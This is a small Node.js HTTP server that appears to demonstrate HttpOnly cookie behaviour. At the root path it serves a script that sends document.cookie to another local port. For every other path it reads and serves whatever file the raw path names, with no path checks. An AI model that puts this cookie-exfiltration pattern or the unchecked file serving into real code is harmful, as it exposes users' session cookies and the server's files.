const http = require('http');
const fs = require('fs');
const url = require('url');

var server = http.createServer((request, response) => {
    //response.setHeader("Access-Control-Allow-Origin","*");
    let pathname = url.parse(request.url).pathname;
    console.log(pathname.substr(1));
    if (pathname.substr(1)) {
        fs.readFile(pathname.substr(1), (err, data) => {
            if (err) {
                console.log(err);
                response.writeHead(404, { "Content-Type": "text/html" });
            } else {
                response.writeHead(200, {
                    "Content-Type": "text/html",
                    'Set-Cookie': ['name=cabbage','age=22','school=emmm; HttpOnly']
                });
                response.write(data.toString());
            }
            response.end();
        });
    } else {
        let data = "<script>fetch('http://localhost:8083?' + document.cookie).then((response) => response.text()).then((val) => {console.log(val);})</script> ";
        response.writeHead(200, { "Content-Type": "text/html" });
        response.write(data.toString());
        response.end();
    }

});

server.listen(8080);